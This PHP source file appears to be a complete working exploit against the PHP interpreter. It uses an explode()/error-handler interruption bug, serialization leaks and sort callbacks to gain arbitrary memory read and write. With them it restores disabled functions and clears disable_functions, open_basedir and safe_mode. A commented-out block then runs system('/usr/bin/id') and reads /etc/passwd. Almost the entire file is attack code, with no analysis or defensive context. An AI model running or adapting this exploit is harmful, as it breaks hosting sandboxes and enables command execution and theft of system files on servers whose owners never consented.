
function hexdump() {}

class asdf_detect
{
	var $sizeof_int;
	var $sizeof_long;
	var $sizeof_ptr;
	
	function execute($leakarray)
	{
		$this->leakarray = &$leakarray;
		$data = $leakarray->asdf_result;
		/* detect endianess and size of integer */
		$temp = substr($data, 0, 8);
		$this->endian = 'l';

		switch ($temp) {
		  case "\x00\x00\x00\x08\x00\x00\x00\x07":
		    $this->endian       = 'b';
		  case "\x08\x00\x00\x00\x07\x00\x00\x00":
		    $this->sizeof_int   = 4;
		    break;
		  case "\x00\x00\x00\x00\x00\x00\x00\x08":
		    $this->endian       = 'b';
		  case "\x08\x00\x00\x00\x00\x00\x00\x00":
		    $this->sizeof_int   = 8;
		    break;
		}

		/* detect size of long */
		$align = 0;
		if ($this->sizeof_int == 4) {
		  $temp = substr($data, 4 * 4, 8);
		  if ($temp == "\xff\x00\x00\x00\x00\x00\x00\x00" || $temp == "\xff\x00\x00\x00\x00\x00\x00\x00") {
		    $this->sizeof_long = 8;
		    $align             = 4;
		  } else {
		    $this->sizeof_long = 4;
		  }
		} else {
		  /* sizeof(long) >= sizeof(int) */
		  $this->sizeof_long = 8;
		}

		$this->offset_ptr = $this->sizeof_int * 3 + $align + $this->sizeof_long;

		$temp1 = substr($data, $this->offset_ptr, 8);
		$temp2 = substr($data, $this->offset_ptr + 8, 8);
		if ($temp1 == $temp2) {
		  $this->sizeof_ptr = 8;
	    } else {
		  $this->sizeof_ptr = 4;
		}

		$this->offset_dtor = $this->offset_ptr + 4 * $this->sizeof_ptr;
		$this->offset_arrbuckets = $this->offset_ptr + 3 * $this->sizeof_ptr;

		// now fill in bucket offsets
		$this->offset_bucket_data_ptr = $this->sizeof_long + $this->sizeof_int;
		while (($this->offset_bucket_data_ptr % $this->sizeof_ptr) !=0) $this->offset_bucket_data_ptr++;
		$this->offset_bucket_data_ptr += $this->sizeof_ptr;
    }
}
class asdf_leakarray
{	
	function error($a,$b)
	{
		if ($this->mode == 1) {
			$this->mode = 2;
			parse_str("2=9&254=4",$this->string);
			@$this->string[0] = $empty;
			$this->string[1] = str_repeat("X", 64);
			$this->string[2] = &$this->string;
		}
		return 1;
	}

    function __sleep()
    {    
        return array(&$this->string);
    }

    function asdf_execute()
    {
		@$this->string = &$GLOBALS[md5(microtime()).'a'];
		$this->mode = 1;
		$this->string = str_repeat("A", 128);
        set_error_handler(array($this, "error"));
		$x = call_user_func_array("explode", array(new StdClass(), &$this->string, 1));
//		$x = explode(new StdClass(), &$this->string, 1);
//		var_dump($x);
		if (is_array($x) && count($x) == 1 && substr($x[0],0,8)!="AAAAAAAA") {
			$this->asdf_result = $x[0];
	        restore_error_handler();
			return;
		}
		$this->mode = 1;
        $this->string = str_repeat("A", 128);
		$x = serialize($this);
hexdump($x);
        restore_error_handler();
        $x = strstr($x, ":128:");
        $x = substr($x, 6, 128);
		$this->asdf_result = $x;
    }
}

class asdf_leakmem
{
	function error($a,$b)
	{
		if ($this->mode == 1) {
			$this->mode = 2;
			$this->string += $this->addr;
		}
		return 1;
	}

    function __sleep()
    {
        return array(&$this->string);
    }

    function execute($addr)
    {
		@$this->string = &$GLOBALS[md5(microtime()).'a'];
		$this->mode = 1;
		$this->string = str_repeat("A", 128);
		$this->addr = $addr;
        set_error_handler(array($this, "error"));
		$x = call_user_func_array("explode", array(new StdClass(), &$this->string, 1));
		if (is_array($x) && count($x) == 1 && substr($x[0],0,8)!="AAAAAAAA") {
			$this->result = $x[0];
	        restore_error_handler();
			return $x[0];
		}
		$this->mode = 1;
		$this->string = str_repeat("A", 128);
        $x = serialize($this);
hexdump($x);
        restore_error_handler();
        $x = strstr($x, ":128:");
        $x = substr($x, 6, 128);
		$this->result = $x;
		return $x;
    }
}

class asdf_memorycorruption
{
	function init(&$util,$data)
	{
		$this->u = &$util;
		$this->d = &$util->detect;
		$this->data = $data;
	}
	
	function __toString()
	{
		if ($this->first && isset($this->arr[2])) {
			$this->first = false;
			$fake_bucket  = $this->u->long2mem(3);
			$fake_bucket .= $this->u->int2mem(0);
			$this->u->stralign4ptr($fake_bucket);
			$fake_bucket .= $this->addr_fake_zval;
			$fake_bucket .= $this->u->dummyptr();
			$fake_bucket .= $this->u->dummyptr();
			$fake_bucket .= $this->u->dummyptr();
			$fake_bucket .= $this->u->dummyptr();
			$fake_bucket .= $this->u->dummyptr();
			$this->u->clearcache();
			unset($this->arr[2]);
			$GLOBALS['_______________________________________________________________A']=1;
			$GLOBALS['_______________________________________________________________B']=2;
			$GLOBALS['_______________________________________________________________C'].=$fake_bucket;
		}
		return "A";
	}
	
	function peekmemory($ptr, $len)
	{
		if ($ptr == $this->u->nullPtr()) {
			debug_print_backtrace();
			die();
		}
		$r = "";
		$ptr .= $this->u->int2mem($len);
		for ($i=0; $i<strlen($ptr); $i++) $this->d->leakarray->string[1][$i] = $ptr[$i];
		for ($i=0; $i<$len; $i++) {
			$r .= $this->arr[$this->u->vermax('5.2.4') ? 1 : 3][$i];
		}
		return $r;
	}
	
	function peekstr($ptr)
	{
		$ret="";
		do {
			$c = $this->peekmemory($ptr,1);
			$ptr = $this->u->ptradd($ptr, 1);
			if ($c != chr(0)) $ret .= $c;
		} while ($c != chr(0));
		return $ret;
	}
	
	function pokememory($ptr, $val)
	{
		if ($ptr == $this->u->nullPtr()) {
			debug_print_backtrace();
			die();
		}
		$ptr .= $this->u->int2mem(strlen($val));		
		for ($i=0; $i<strlen($ptr); $i++) $this->d->leakarray->string[1][$i] = $ptr[$i];
		for ($i=0; $i<strlen($val); $i++) {
			$this->arr[$this->u->vermax('5.2.4') ? 1 : 3][$i]=$val[$i];
		}
	}
	
	function execute()
	{	
		if ($this->u->vermin('5.3.0')) {
			gc_disable();
		}
		$this->first = true;
		$z = new asdf_leakmem();
		// retrieve pointer to arrBuckets
		$u=$this->u->ptrvalue(substr($this->data, $this->d->offset_arrbuckets, $this->d->sizeof_ptr));
		$arrbuckets=$z->execute($u);
//		hexdump(substr($this->data, $this->d->offset_arrbuckets, $this->d->sizeof_ptr));
//		hexdump($arrbuckets);
		// retrieve pointer to index 0 -> empty var bucket
		$u=$this->u->ptrvalue(substr($arrbuckets, 0 * $this->d->sizeof_ptr, $this->d->sizeof_ptr));
		$bucket = $z->execute($u);
		// retrieve pointer to empty_zval
		$this->addr_empty_zval = substr($bucket, $this->d->offset_bucket_data_ptr, $this->d->sizeof_ptr);
		$u=$this->u->ptrvalue($this->addr_empty_zval);
//		hexdump($this->addr_empty_zval);
		$empty_zval = $z->execute($u);
//		hexdump($empty_zval);

		// retrieve pointer to index 2 -> array itself
		$u=$this->u->ptrvalue(substr($arrbuckets, 2 * $this->d->sizeof_ptr, $this->d->sizeof_ptr));
		$abucket = $z->execute($u);
		// retrieve pointer to array
		$this->addr_array_zval = substr($abucket, $this->d->offset_bucket_data_ptr, $this->d->sizeof_ptr);
		$u=$this->u->ptrvalue($this->addr_array_zval);
		$this->addr_array = substr($z->execute($u), 0, $this->d->sizeof_ptr);
		
		// retrieve pointer to index 1 -> fake_zval bucket
		$u=$this->u->ptrvalue(substr($arrbuckets, 1 * $this->d->sizeof_ptr, $this->d->sizeof_ptr));
		$bucket = $z->execute($u);
		// retrieve pointer to string_zval
		$this->addr_fake_zval = substr($bucket, $this->d->offset_bucket_data_ptr, $this->d->sizeof_ptr);
//		hexdump($bucket);
		$u=$this->u->ptrvalue($this->addr_fake_zval);
		$fake_zval = $z->execute($u);
//		hexdump($fake_zval);
		// retrieve pointer to string
		$u=$this->u->ptrvalue(substr($fake_zval, 0, $this->d->sizeof_ptr));
		$string = $z->execute($u);
		
		// setup the fake string zval
        $size_zvalue = max($this->d->sizeof_ptr + $this->d->sizeof_int, 2 * $this->d->sizeof_ptr);
        $zval = $this->addr_fake_zval;
		$zval .= $this->u->int2mem(128);
        while (strlen($zval) < $size_zvalue) $zval .= "X";
        
        if ($this->u->vermax('5.0.0')) {
            $zval .= "\x03\x00";
            $zval .= $this->u->short2mem(1);
            $zval .= "\x00";
        } else {
            $zval .= $this->u->int2mem(1);
            $zval .= $this->u->vermin('5.1.0') ? "\x06" : "\x03";
            $zval .= "\x00";
        }
		for ($i=0; $i<strlen($zval); $i++) $this->d->leakarray->string[1][$i] = $zval[$i];
		
		$string = $z->execute($u);
//		hexdump("HERE-x");
//		hexdump($string);
		
		
		if ($this->u->vermax('5.2.4')) {
			$this->arr = array(0 => str_repeat("B", 400), 1 => str_repeat("B", 400),2 => str_repeat("B", 400),3 => str_repeat("B", 400));
			@usort($this->arr, array($this, "__toString"));
		} else {
			$this->arr = array(0 => &$this, 1 => str_repeat("B", 400),2 => str_repeat("B", 400),3 => str_repeat("B", 400));
			@sort($this->arr, SORT_STRING);	
		}
		
		$addr = $this->addr_array;
		$addr = $this->u->ptradd($addr, $this->d->offset_dtor);
		$this->pokememory($addr, $this->u->nullptr());
//		hexdump($addr);
		$this->d->leakarray->string[] = &$this->arr;
		$this->d->leakarray->string[] = &$this;
		
//		hexdump($this->peekmemory("\x44\x44\x44\x44\x44\x44\x44\x44", 128));
		
//		echo "FindFunctionHashtable()\n";
		$this->addr_function_hashtable=$this->findFunctionHashtable();
//		echo "getHashtable()\n";
		$this->function_hashtable=$this->getHashtable($this->addr_function_hashtable);
//		echo "findIniHashtable()\n";
		$this->addr_ini_hashtable=$this->findIniHashtable();
//		echo "getHashtable()\n";
		$this->ini_hashtable=$this->getHashtable($this->addr_ini_hashtable);
//		echo "reactivateFunctions()\n";
		$this->reactivateFunctions();
//		echo "fixIniEntries\n";
		$this->fixIniEntries();

		ini_set("enable_dl", "1");
		ini_set("open_basedir", "");
		ini_set("disable_functions","");
		ini_set("safe_mode", "0");
		set_time_limit(0);
/*		error_reporting(E_ALL);
		system("/usr/bin/id");
		echo file_get_contents("/etc/passwd");
		die();*/
	}
	
	function findFunctionHashtable()
	{
	  $cmp_int = 0x33887766;
	  error_reporting($cmp_int);
	  $cmp_str = $this->u->int2mem($cmp_int);
	  $addr = $this->addr_empty_zval;
	  do {
		$val = $this->peekmemory($addr, $this->d->sizeof_int);
	    if ($cmp_str == $val) {
	      $cmp_int++;
	      error_reporting($cmp_int);
		  $cmp_str = $this->u->int2mem($cmp_int);
	      if ($cmp_str == $this->peekmemory($addr, $this->d->sizeof_int)) {
	        error_reporting(0);
			$addr = $this->u->ptradd($addr, 3 * $this->d->sizeof_int);
			$addr = $this->u->ptralign($addr, $this->d->sizeof_ptr);
			$addr = $this->u->ptradd($addr, $this->d->sizeof_ptr);
	        $addr = $this->peekmemory($addr, $this->d->sizeof_ptr);
	        return $addr;
	      }
	    }
		$addr = $this->u->ptradd($addr, $this->d->sizeof_int);
	  } while (1);

	  return $addr;
	}
	
	function findIniHashtable()
	{
	  for ($i=0; $i<35; $i++) {
	    $cmp_int = 0 + substr(create_function('',''),8);
	  }
	  $cmp_str = $this->u->int2mem($cmp_int);

	  $addr = $this->addr_empty_zval;
	  do {
	    if ($cmp_str == $this->peekmemory($addr, $this->d->sizeof_int)) {
	      $cmp_int = 0 + substr(create_function('',''),8);
	      $cmp_str = $this->u->int2mem($cmp_int);
	      if ($cmp_str == $this->peekmemory($addr, $this->d->sizeof_int)) {
			$addr = $this->u->ptradd($addr, $this->d->sizeof_int);
			$addr = $this->u->ptralign($addr, $this->d->sizeof_ptr);
	        /* PHP < 4.3.0 has Hashtable directly in Globals */
	        if ($this->u->vermin('4.3.0')) {
	          $addr = $this->peekmemory($addr, $this->d->sizeof_ptr);
	        }
	        return $addr;
	      }
	    }
		$addr = $this->u->ptradd($addr, $this->d->sizeof_int);
	  } while (1);

	}
	
	function getHashtable($haddr)
	{
	  $retval = array();

	  $nullPtr = str_repeat(chr(0), $this->d->sizeof_ptr);

	  /* Adjust */
	  $haddr = $this->u->ptralign($haddr, $this->d->sizeof_int);
	  $haddr = $this->u->ptradd($haddr, $this->d->sizeof_int*3);
	  $haddr = $this->u->ptralign($haddr, $this->d->sizeof_long);
	  $haddr = $this->u->ptradd($haddr, $this->d->sizeof_long);
	  $haddr = $this->u->ptralign($haddr, $this->d->sizeof_ptr);
	  $haddr = $this->u->ptradd($haddr, $this->d->sizeof_ptr);

	  $next = $this->peekmemory($haddr, $this->d->sizeof_ptr);
	  while ($next != $nullPtr) {

	    /* Read Bucket */
	    $next = $this->u->ptralign($next, $this->d->sizeof_long);
	    $bucket_h = $this->peekmemory($next, $this->d->sizeof_long);
	    $next = $this->u->ptradd($next, $this->d->sizeof_long);

	    $next = $this->u->ptralign($next, $this->d->sizeof_int);
	    $bucket_keylen = $this->u->mem2int($this->peekmemory($next, $this->d->sizeof_int));
	    $next = $this->u->ptradd($next, $this->d->sizeof_int);

	    $next = $this->u->ptralign($next, $this->d->sizeof_ptr);
	    $bucket_dataptr = $this->peekmemory($next, $this->d->sizeof_ptr);
	    $next = $this->u->ptradd($next, $this->d->sizeof_ptr*2);

	    $xxxx = $next;
	    $next = $this->peekmemory($next, $this->d->sizeof_ptr);

	    if ($bucket_keylen != 0) {
	      $bucket_key = $this->u->ptradd($xxxx, $this->d->sizeof_ptr*4);
	      $key = $this->peekmemory($bucket_key, $bucket_keylen-1);	
	      $retval[$key] = $bucket_dataptr;
	    } else {
	      $retval[$bucket_h] = $bucket_dataptr;
	    }
	  }

	  return ($retval);
	}
	
	function fixIniEntries()
	{
	  $val = $this->u->int2mem(0xff);

	  foreach ($this->ini_hashtable as $k => $addr) {
	    $addr = $this->u->ptradd($addr, $this->d->sizeof_int);
	    $this->pokememory($addr, $val);
	  }

	  /* Restore OnUpdateString for open_basedir Setting */
	  /* REQUIRED for PHP 5.3 */
	
	  $offset_on_modify = 2 * $this->d->sizeof_int;
	  while (($offet_on_modify % $this->d->sizeof_ptr)!=0) $offset_on_modify++;
	  $offset_on_modify += $this->d->sizeof_ptr + $this->d->sizeof_int;
	  while (($offet_on_modify % $this->d->sizeof_ptr)!=0) $offset_on_modify++;
	
	  $addr_user_dir_modify = $this->u->ptradd($this->ini_hashtable['user_dir'], $offset_on_modify);
	  $addr_open_basedir_modify = $this->u->ptradd($this->ini_hashtable['open_basedir'], $offset_on_modify);
	  $this->pokememory($addr_open_basedir_modify, $this->peekmemory($addr_user_dir_modify, $this->d->sizeof_ptr));
	  

	}
	
	function findBasicfunctions()
	{
		$basicfunctions = get_extension_funcs("standard");
		$minaddr = null;
		foreach ($basicfunctions as $func) {
			if (!function_exists($func)) continue;
//			echo "$func\n";
		    $arr = $this->getFunction($this->function_hashtable[$func]);
			if (isset($arr['module'])) {
//				echo "Found module function shortcut...\n";
				$addr = $arr['module'];
//				hexdump($addr);
//				hexdump($this->peekmemory($addr, 128));
				
				$addr = $this->u->ptradd($addr, 2);
				$addr = $this->u->ptralign($addr, $this->d->sizeof_int);
				$addr = $this->u->ptradd($addr, $this->d->sizeof_int);
				$addr = $this->u->ptradd($addr, 2);
				$addr = $this->u->ptralign($addr, $this->d->sizeof_ptr);
				$addr = $this->u->ptradd($addr, $this->d->sizeof_ptr*3);
				$addr = $this->peekmemory($addr, $this->d->sizeof_ptr);
//				hexdump($addr);
				return $addr;
			} 
			
			// Only collect lowest arg_info pointer
			$v = $this->u->ptrvalue($arr['arg_info']);
			if ($v == 0) continue;
			
			if ($minaddr == null || $v < $minaddr) {
				$minaddr = $v;
				$addr = $arr['arg_info'];
			}
		}
		
		$cmp = $arr['name_ptr'] . $arr['handler'];
		$addr = $this->u->ptralign($addr, $this->d->sizeof_ptr);
		while (1) {
		    $data = $this->peekmemory($addr, $this->d->sizeof_ptr * 4096);
		    for ($i=0; $i<4096-1; $i++) {
		      if ($cmp == substr($data, $i*$this->d->sizeof_ptr, $this->d->sizeof_ptr *2)) {
		        $addr = $this->u->ptradd($addr, $this->d->sizeof_ptr*$i);
		        break 2;
		      }
		    }

	        $addr = $this->u->ptradd($addr, $this->d->sizeof_ptr*(4096-2));
		}
		
		$size = $this->u->vermax('5.0.0') ? ($this->d->sizeof_ptr * 3) : ($this->d->sizeof_ptr * 3 + $this->d->sizeof_int * 2); 
		  while (1) {
		    $addr = $this->u->ptradd($addr, -$size);
		    $fname_ptr = $this->peekmemory($addr, $this->d->sizeof_ptr);
		    $fname = $this->peekstr($fname_ptr);
		    if ($fname == 'constant') {
		      break;
		    }
		  }
		return $addr;
		
	}
	
	function reactivateFunctions()
	{
		$addr = $this->findBasicfunctions();
	  $nullPtr = $this->u->nullPtr();
	  $size = $this->u->vermax('5.0.0') ? ($this->d->sizeof_ptr * 3) : ($this->d->sizeof_ptr * 3 + $this->d->sizeof_int * 2);
//	hexdump($addr); flush();ob_flush();$i=1;
//	hexdump("HERE");
	  while (1) {
		$i++;
		$this->u->ptralign($addr, $this->d->sizeof_ptr);
		$base = $addr;
		
	    $fname_ptr = $this->peekmemory($addr, $this->d->sizeof_ptr);
	    if ($fname_ptr == $nullPtr) {
		return;
	    }

	    $fname = $this->peekstr($fname_ptr);
		$addr = $this->u->ptradd($addr, $this->d->sizeof_ptr);
	    $fhandler = $this->peekmemory($addr, $this->d->sizeof_ptr);
		$addr = $this->u->ptradd($addr, $this->d->sizeof_ptr);
	    $arginfo = $this->peekmemory($addr, $this->d->sizeof_ptr);
		
	    $this->setFunction($this->function_hashtable[$fname], $fhandler, $arginfo);
	    $addr = $this->u->ptradd($base, $size);

	  }
	}
	
	function getFunction($addr)
	{
	  $arr = array();

	  $type = $this->peekmemory($addr, 1);
	  if ($type != "\x01") {
	    return null;
	  }
		
	  $addr = $this->u->ptradd($addr, 1);
	  $addr = $this->u->ptralign($addr, $this->d->sizeof_ptr);
	  if ($this->u->vermax('5.0.0')) {
		$addr = $this->u->ptradd($addr, $this->d->sizeof_ptr);
	  }
	  $name_ptr = $this->peekmemory($addr, $this->d->sizeof_ptr);
	  $arr['name'] = $this->peekstr($name_ptr);
	  $arr['name_ptr'] = $name_ptr;

	  if ($this->u->vermin('5.0.0')) {
		$addr = $this->u->ptralign($addr, $this->d->sizeof_ptr);
		$addr = $this->u->ptradd($addr, $this->d->sizeof_ptr*2);
		$addr = $this->u->ptralign($addr, $this->d->sizeof_int);
		$addr = $this->u->ptradd($addr, $this->d->sizeof_int);
		$addr = $this->u->ptralign($addr, $this->d->sizeof_ptr);
		$addr = $this->u->ptradd($addr, $this->d->sizeof_ptr);
		$addr = $this->u->ptralign($addr, $this->d->sizeof_int);
		$addr = $this->u->ptradd($addr, $this->d->sizeof_int*2);
		$addr = $this->u->ptralign($addr, $this->d->sizeof_ptr);
	    $arr['arg_info'] = $this->peekmemory($addr, $this->d->sizeof_ptr);
		$addr = $this->u->ptradd($addr, $this->d->sizeof_ptr);
		$addr = $this->u->ptradd($addr, 2);
		$addr = $this->u->ptralign($addr, $this->d->sizeof_ptr);
	  } else {
		$addr = $this->u->ptralign($addr, $this->d->sizeof_ptr);
	    $arr['arg_info'] = $this->peekmemory($addr, $this->d->sizeof_ptr);
		$addr = $this->u->ptradd($addr, $this->d->sizeof_ptr);
	  }
	  $arr['handler'] = $this->peekmemory($addr, $this->d->sizeof_ptr);
	  if ($this->u->vermin('5.2.3')) {
		$addr = $this->u->ptradd($addr, $this->d->sizeof_ptr);
		$arr['module'] = $this->peekmemory($addr, $this->d->sizeof_ptr);
	  }

  	  return $arr;
	}

	function setFunction($addr, $handler, $arginfo)
	{
	  $arr = array();

	  $type = $this->peekmemory($addr, 1);
	  if ($type != "\x01") {
	    return null;
	  }
	
	  $addr = $this->u->ptradd($addr, 1);
	  $addr = $this->u->ptralign($addr, $this->d->sizeof_ptr);
	  if ($this->u->vermax('5.0.0')) {
		$addr = $this->u->ptradd($addr, $this->d->sizeof_ptr);
	  }
	  if ($this->u->vermin('5.0.0')) {
		$addr = $this->u->ptralign($addr, $this->d->sizeof_ptr);
		$addr = $this->u->ptradd($addr, $this->d->sizeof_ptr*2);
		$addr = $this->u->ptralign($addr, $this->d->sizeof_int);
		$addr = $this->u->ptradd($addr, $this->d->sizeof_int);
		$addr = $this->u->ptralign($addr, $this->d->sizeof_ptr);
		$addr = $this->u->ptradd($addr, $this->d->sizeof_ptr);
		$addr = $this->u->ptralign($addr, $this->d->sizeof_int);
		$addr = $this->u->ptradd($addr, $this->d->sizeof_int*2);
		$addr = $this->u->ptralign($addr, $this->d->sizeof_ptr);
	    $this->pokememory($addr, $arginfo);
		$addr = $this->u->ptradd($addr, $this->d->sizeof_ptr);
		$addr = $this->u->ptradd($addr, 2);
		$addr = $this->u->ptralign($addr, $this->d->sizeof_ptr);
	  } else {
		$addr = $this->u->ptralign($addr, $this->d->sizeof_ptr);
	    $this->pokememory($addr, $arginfo);
		$addr = $this->u->ptradd($addr, $this->d->sizeof_ptr);
	  }
	  $this->pokememory($addr, $handler);
  	  return $arr;
	}

	
}

class asdf_util
{
	function init(&$detect)
	{
		$this->detect = &$detect;
	    $this->v = explode('.', PHP_VERSION);
	    $this->v[0] += 0;
	    $this->v[1] += 0;
	    $this->v[2] += 0;
	}
	
	function vermin($vstr)
	{
	    $v = explode('.', $vstr);
	    $v[0] += 0;
	    $v[1] += 0;
	    $v[2] += 0;
	    if ($v[0] > $this->v[0]) return false;
	    if ($v[0] < $this->v[0]) return true;
	    if ($v[1] > $this->v[1]) return false;
	    if ($v[1] < $this->v[1]) return true;
	    if ($v[2] > $this->v[2]) return false;
	    return true;
	}
	
	function vermax($vstr)
	{
	    return !$this->vermin($vstr);
	}
	
	function stralign4ptr(&$str)
	{
		while ((strlen($str) % $this->detect->sizeof_ptr)!=0) { $str .= "X"; }
	}
	
	function nullptr()
	{
		return str_repeat("\x00", $this->detect->sizeof_ptr);
	}
	
	function ptrvalue($val)
	{
		$res = 0;
		
		if ($this->detect->endian == 'l') {
			$val = strrev($val);
		}
		
		for ($i=0; $i<$this->detect->sizeof_ptr; $i++) {
			$res <<= 8;
			$res |= ord($val[$i]);
		}
		return $res;
	}

	function mem2int($val)
	{
		$res = 0;
		
		if ($this->detect->endian == 'l') {
			$val = strrev($val);
		}
		
		for ($i=0; $i<$this->detect->sizeof_int; $i++) {
			$res <<= 8;
			$res |= ord($val[$i]);
		}
		return $res;
	}

	function ptralign($ptr, $size)
	{
		$val = $this->ptrvalue($ptr);
		while (($val % $size) !=0) $val++;
		return $this->long2mem($val);
	}

	function ptradd($ptr, $add)
	{
		$val = $this->ptrvalue($ptr);
		$val += $add;
		return $this->long2mem($val);
	}

	
	function long2mem($l)
	{
		$out = "";
		for ($i=0; $i<$this->detect->sizeof_long; $i++) {
			$tmp  = $l & 0xff;
			$out .= chr($tmp);
			$l >>= 8;
		}
		
		if ($this->detect->endian == 'b') {
			$out = strrev($out);
		}
		return $out;
	}

	function int2mem($l)
	{
		$out = "";
		for ($i=0; $i<$this->detect->sizeof_int; $i++) {
			$tmp  = $l & 0xff;
			$out .= chr($tmp);
			$l >>= 8;
		}
		
		if ($this->detect->endian == 'b') {
			$out = strrev($out);
		}
		return $out;
	}

	function short2mem($l)
	{
		$out = "";
		for ($i=0; $i<2; $i++) {
			$tmp  = $l & 0xff;
			$out .= chr($tmp);
			$l >>= 8;
		}
		
		if ($this->detect->endian == 'b') {
			$out = strrev($out);
		}
		return $out;
	}
	
	function dummyptr()
	{
		$out = "";
		for ($i=0; $i<$this->detect->sizeof_ptr; $i++) {
			$out .= "X"; // chr(65 + mt_rand(26));
		}
		return $out;
	}
	
	function clearcache()
	{
		if (!isset($GLOBALS['cc'])) {
			$GLOBALS['cc'] = array();
			$GLOBALS['ccnt'] = 0;
		}
		$GLOBALS['cc'][++$GLOBALS['ccnt']] = array();
		$x = &$GLOBALS['cc'][$GLOBALS['ccnt']];
		for ($i=1; $i<200; $i++) {
			restore_error_handler();
			$x[] = str_repeat("A", $i);
			$x[] = str_repeat("A", $i);
		}
	}

}
class asdf_main
{
	function asdf_init()
	{
	    $asdf_arr = array(2=>9,254=>1);
	    $asdf_x = new asdf_leakarray($asdf_arr);
	    $asdf_x->asdf_execute();
	 //   hexdump($asdf_x->asdf_result);
	    $asdf_d = new asdf_detect();
	    $asdf_d->execute($asdf_x);
	    $asdf_u = new asdf_util();
	    $asdf_u->init($asdf_d);
	    $xasdf_m = new asdf_memorycorruption();
	    $xasdf_m->init($asdf_u,$asdf_x->asdf_result);
	    $xasdf_m->execute();
	}
}

try {
   $asdf_xploit=new asdf_main();
   $asdf_xploit->asdf_init();
    }
catch (Exception $e) {

}

